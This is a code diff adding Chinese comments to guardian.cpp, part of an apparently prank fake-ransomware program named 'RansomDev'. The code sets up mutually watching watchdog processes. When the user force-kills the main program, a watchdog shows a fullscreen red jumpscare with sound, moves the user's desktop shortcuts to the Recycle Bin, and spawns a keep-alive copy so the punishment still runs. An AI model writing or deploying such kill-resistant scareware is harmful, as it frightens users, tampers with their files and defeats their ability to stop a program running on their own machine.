@@ -1,6 +1,6 @@
-
-
-
+// ============================================================================
+//  guardian.cpp
+// ============================================================================
 #include "guardian.h"
 
 #include "audio.h"
@@ -23,26 +23,26 @@
 
 namespace {
 
-
-
+    // 命名事件的公共前缀。用 Local\ 前缀避免跨会话撞名
+    // （多用户环境里各人有各人的会话，不该互相干扰）。
     const wchar_t* kDisarmPrefix = L"Local\\RansomDev_Disarm_";
     const wchar_t* kPunishMarkName = L"ransom_dev_punish.done";
 
-
-    HANDLE g_disarmEvent = nullptr;
-    HANDLE g_guardianProcess = nullptr;
+    // 主进程侧的状态
+    HANDLE g_disarmEvent = nullptr;   // 主进程自己的 Disarm 事件
+    HANDLE g_guardianProcess = nullptr;   // 守护进程句柄
     DWORD  g_guardianPid = 0;
     DWORD  g_lastCheckTick = 0;
     bool   g_disarmed = false;
 
-
+    // ---------------------------------------------------------------- 工具 ----
 
     void MakeDisarmName(DWORD pid, wchar_t* buf, size_t cch)
     {
         swprintf_s(buf, cch, L"%s%lu", kDisarmPrefix, (unsigned long)pid);
     }
 
-
+    // 打开一个命名事件（只要 SYNCHRONIZE 就够了 —— 我们只等它 signaled）。
     HANDLE OpenDisarmEvent(DWORD pid)
     {
         wchar_t name[128];
@@ -50,22 +50,22 @@ namespace {
         return OpenEventW(SYNCHRONIZE, FALSE, name);
     }
 
-
-
-
-
+    // 创建自己的 Disarm 事件。
+    // 名字里带 pid，pid 复用的情况下会打开到同一个事件 —— 用 CREATE_ALWAYS
+    // 语义（自动重置）比 CreateEventW 更好，但 Win32 没这个标志，
+    // 所以用 SetEvent 之前先 ResetEvent 抹掉旧状态。
     HANDLE CreateDisarmEvent(DWORD pid)
     {
         wchar_t name[128];
         MakeDisarmName(pid, name, _countof(name));
         HANDLE h = CreateEventW(nullptr, TRUE, FALSE, name);
-
-
-
+        // 注意：如果事件已存在，CreateEventW 会打开它并设置 ERROR_ALREADY_EXISTS。
+        // 此时不要 ResetEvent，以免抹掉别的进程/线程已经 SetEvent 的状态。
+        // 新建的事件初始就是未信号，也不需要 Reset。
         return h;
     }
 
-
+    // 「惩罚已经跑过」的标记文件路径。失败返回空串。
     std::wstring PunishMarkPath()
     {
         wchar_t dir[MAX_PATH] = {};
@@ -99,14 +99,14 @@ namespace {
         return buf;
     }
 
-
-
+    // 拉起一个守护进程。generation 见 guardian.h。
+    // 成功返回进程句柄（调用方负责 CloseHandle），失败返回 nullptr。
     HANDLE SpawnGuardian(DWORD targetPid, int generation)
     {
         const std::wstring exe = ExePath();
         if (exe.empty()) return nullptr;
 
-
+        // CreateProcessW 的 lpCommandLine 要求可写缓冲，所以拷一份
         wchar_t cmd[512];
         swprintf_s(cmd, L"\"%s\" --guardian %lu %d",
             exe.c_str(), (unsigned long)targetPid, generation);
@@ -114,9 +114,9 @@ namespace {
         STARTUPINFOW si = { sizeof(STARTUPINFOW) };
         PROCESS_INFORMATION pi = {};
 
-
-
-
+        // 这是 GUI 子系统程序，不会弹控制台，所以不用 CREATE_NO_WINDOW。
+        // 不加 CREATE_BREAKAWAY_FROM_JOB：万一被别的 job 关着，
+        // 加这个标志反而会失败、拉不起来。
         if (!CreateProcessW(exe.c_str(), cmd, nullptr, nullptr, FALSE, 0,
             nullptr, nullptr, &si, &pi))
         {
@@ -129,8 +129,8 @@ namespace {
         return pi.hProcess;
     }
 
-
-
+    // 进程还活着吗？用 SYNCHRONIZE 句柄 + 0 超时 Wait。
+    // 拿不到句柄（进程不存在 / 权限不足）一律当「不在了」。
     bool ProcessAlive(DWORD pid)
     {
         HANDLE h = OpenProcess(SYNCHRONIZE, FALSE, pid);
@@ -140,9 +140,9 @@ namespace {
         return (r == WAIT_TIMEOUT);
     }
 
-}
+} // namespace
 
-
+// ============================================================================
 namespace guardian {
 
     void ClearPunishMark()
@@ -151,21 +151,21 @@ namespace guardian {
         if (!p.empty()) DeleteFileW(p.c_str());
     }
 
+    // ---------------------------------------------------------------- 主进程侧 ----
 
-
-    bool Start(HINSTANCE          )
+    bool Start(HINSTANCE /*hInst*/)
     {
-        if (g_disarmEvent) return true;
+        if (g_disarmEvent) return true;   // 已经起来过了
 
         const DWORD myPid = GetCurrentProcessId();
 
-
+        // 自己的 Disarm 事件（监视我的人靠它判断我是不是正常退出）
         g_disarmEvent = CreateDisarmEvent(myPid);
         if (!g_disarmEvent)
         {
             elog::Write(L"[guardian] 创建 Disarm 事件失败, err=%lu", GetLastError());
-
-
+            // 事件建不出来就别启动守护了：守护会误把每次正常退出都当成强杀，
+            // 于是每次关程序都跑一遍惩罚。
             return false;
         }
 
@@ -195,18 +195,18 @@ namespace guardian {
 
     void Tick()
     {
-        if (!g_disarmEvent) return;
+        if (!g_disarmEvent) return;      // Start 失败过，不折腾
 
         const DWORD now = GetTickCount();
-        if (now - g_lastCheckTick < 1000) return;
+        if (now - g_lastCheckTick < 1000) return;   // 一秒看一次就够
         g_lastCheckTick = now;
 
         if (g_guardianProcess)
         {
             const DWORD r = WaitForSingleObject(g_guardianProcess, 0);
-            if (r == WAIT_TIMEOUT) return;
+            if (r == WAIT_TIMEOUT) return;   // 还活着
 
-
+            // 守护死了：关掉旧句柄，重新拉一个
             CloseHandle(g_guardianProcess);
             g_guardianProcess = nullptr;
             g_guardianPid = 0;
@@ -237,7 +237,7 @@ namespace guardian {
         g_guardianPid = 0;
     }
 
-
+    // ---------------------------------------------------------------- 守护进程侧 ----
 
     bool IsGuardianMode()
     {
@@ -259,8 +259,8 @@ namespace guardian {
             targetPid = (DWORD)_wtoi(argv[i + 1]);
             if (targetPid == 0) return false;
 
-
-
+            // 下一个参数如果不是 "--" 开头，就当 generation。
+            // 不这么判的话，"--guardian 1234 --diag log.txt" 会把 "--diag" 当 gen。
             if (i + 2 < argc && argv[i + 2][0] != L'-')
                 generation = _wtoi(argv[i + 2]);
 
@@ -269,17 +269,17 @@ namespace guardian {
         return false;
     }
 
-
-
-
-
-
-
-
-
-
-
-
+    // 守护进程里跑一遍「没付清」的惩罚演出。
+    //
+    // 这里**不**复用 director —— 那是主进程的状态机，它依赖的 popup、
+    // gold、lockdown 等模块在守护进程里都没起来，状态对不上。所以走一个
+    // 独立、自包含的简化版：
+    //   1. 全屏红黑底 + 雪花（和主进程 PHASE_PUNISH 的配色一致）
+    //   2. 张口脸 jumpscare + Glitchyhitfaster 音效
+    //   3. 桌面快捷方式进回收站
+    //   4. 给演出留够时间，收尾退出
+    //
+    // 用户看到的效果和主进程里走 PHASE_PUNISH 几乎一样。
     static void RunPunishShow()
     {
         elog::Write(L"[guardian] === 开始惩罚演出 ===");
@@ -292,29 +292,29 @@ namespace guardian {
         const HRESULT hrCom = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
         HINSTANCE hInst = GetModuleHandleW(nullptr);
 
-
+        // 这些模块在守护进程里都是「第一次启动」，互不依赖主进程的状态。
         if (gdipOk)
         {
             face::Start(hInst);
             fx::Start(hInst);
         }
-        gold::Start(hInst);
+        gold::Start(hInst);        // 让 recycle 能靠 IsOurCoinFile 过滤掉自己的金币
         recycle::Start(hInst);
         audio::Start();
 
-
+        // 全屏红黑底 + 雪花
         fx::SetSolid(true, RGB(80, 0, 0));
         fx::SetNoise(55);
 
         face::ShowAttack(4000);
         audio::PlayHit();
 
-
+        // 桌面快捷方式进回收站
         const int n = recycle::SendToBin();
         elog::Write(L"[guardian] 回收站：收走 %d 个快捷方式", n);
 
-
-
+        // 跑消息循环等演出走完。
+        // face 的 jumpscare 定时器、fx 的雪花定时器都挂在这个循环上。
         const DWORD start = GetTickCount();
         MSG msg;
         while (GetTickCount() - start < 4500)
@@ -327,7 +327,7 @@ namespace guardian {
             Sleep(10);
         }
 
-
+        // 收尾
         fx::ClearAll();
         face::Hide();
         audio::Silence();
@@ -346,7 +346,7 @@ namespace guardian {
 
     int RunGuardian(HINSTANCE hInst, DWORD targetPid, int generation)
     {
-
+        // 守护进程写自己的日志（带 pid），免得和主进程那份混在一起。
         wchar_t tempDir[MAX_PATH] = {};
         GetTempPathW(_countof(tempDir), tempDir);
 
@@ -359,17 +359,17 @@ namespace guardian {
             (unsigned long)GetCurrentProcessId(),
             (unsigned long)targetPid, generation);
 
-
+        // 自己的 Disarm 事件（监视我的人靠它判断我是不是正常退出）
         HANDLE myDisarm = CreateDisarmEvent(GetCurrentProcessId());
         if (!myDisarm)
             elog::Write(L"[guardian] 自己的 Disarm 事件创建失败, err=%lu", GetLastError());
 
-
+        // 目标的 Disarm 事件（拿不到不是错：目标可能还没来得及创建）
         HANDLE targetDisarm = OpenDisarmEvent(targetPid);
 
         int exitCode = 0;
 
-
+        // 目标已经没了？（罕见，但如果主进程刚启动就被杀就可能撞上）
         if (!ProcessAlive(targetPid))
         {
             elog::Write(L"[guardian] 目标进程 %lu 一启动就没了",
@@ -385,14 +385,14 @@ namespace guardian {
             return exitCode;
         }
 
-
-
-
-
+        // ---- 等目标退出 ----
+        // 轮询而不是用 WaitForMultipleObjects：目标可能 Disarm 之后还要花
+        // 一会儿才真正退，需要区分「Disarm 了但还活着」和「进程真没了」，
+        // 轮询写起来更直白。
         bool targetDisarmed = false;
         for (;;)
         {
-
+            // Disarm 事件 signaled 了？记下来（目标可能在走正常退出流程）
             if (targetDisarm &&
                 WaitForSingleObject(targetDisarm, 0) == WAIT_OBJECT_0)
             {
@@ -417,12 +417,12 @@ namespace guardian {
         }
         else
         {
-
-
+            // 先把「惩罚已经跑过」写下来，再开始跑。
+            // 这样即使我在跑的过程中被强杀，保活进程也不会把惩罚再跑一遍。
             MarkPunishRan();
 
-
-
+            // 只有「主守护」（generation 0）才创建保活进程。
+            // 保活守护自己（generation 1）不再递归创建 —— 否则无限套娃。
             if (generation == 0)
             {
                 HANDLE keepAlive = SpawnGuardian(GetCurrentProcessId(), 1);
@@ -441,7 +441,7 @@ namespace guardian {
             RunPunishShow();
         }
 
-
+        // 正常退出：SetEvent 通知监视我的人（保活进程）
         if (myDisarm) SetEvent(myDisarm);
 
         if (targetDisarm) CloseHandle(targetDisarm);
@@ -451,4 +451,4 @@ namespace guardian {
         return exitCode;
     }
 
-}
+} // namespace guardian
